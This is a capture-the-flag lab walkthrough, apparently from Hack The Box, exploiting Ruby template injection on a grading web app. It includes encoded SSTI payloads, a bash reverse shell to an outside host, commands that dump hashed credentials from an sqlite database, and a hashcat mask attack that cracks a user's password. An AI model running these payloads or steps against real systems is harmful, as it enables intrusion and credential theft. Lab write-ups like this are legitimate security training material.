First go to the URL in Burp.
```
http://10.129.229.121/weighted-grade
```
Single encoding doesn't work
![[Pasted image 20240605172257.png]]
LEt's double encode. 
![[Pasted image 20240605172413.png]]
Still doesn't work.
Changing the content type doesn't work. 
![[Pasted image 20240605172609.png]]
OK SO Let's try putting in a return key.
![[Pasted image 20240605172938.png]]
Back to the drawing board. 
We note that the programming language used in the site is ruby.
![[Pasted image 20240605174115.png]]
Therefore we can try some ruby exploits.  The first few don't work on the Hacktricks site:
[SSTI (Server Side Template Injection) | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
Using cyberchef we attempt:
```ruby
<%= system("whoami") %>
```
Which encodes to 
```html
3c%25%3d%20%73%79%73%74%65%6d%28%22%77%68%6f%61%6d%69%22%29%20%25%3e
```
Finally, a response,  it responds with "true"
So let's do some more bullshit and try to get a reverse shell. 
Let's do a generic one.
```ruby
<%= system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/8008 0>&1'") %>
```
encodes to
```
3c%25%3d%20%73%79%73%74%65%6d%28%22%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%35%2f%38%30%30%38%20%30%3e%26%31%27%22%29%20%25%3e
```
BOOM shell

### ROOT
We note in the home directory there is a credentials db for pupilpath. 
We also see htat this is running sqlite3.
```sh
ls /bin/ | grep sql
```
So we now have some stuff
```sqlite
sqlite3 /home/susan/Migration/pupilpath_credentials.db
.databases
.tables
select * from users;
```
aaand we have hashes! woot.
ok. let's decrypt these. 

```
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```
We find rockyou doesn't decrypt these as is. 
So let's see if we can find how the passwords are formatted. 
Within /var/spool/mail
There's a file called susan.
It says:
```sh
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

```
OK
So we can crackz
```sh
hashcat -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
```

And password:
susan_nasus_413759210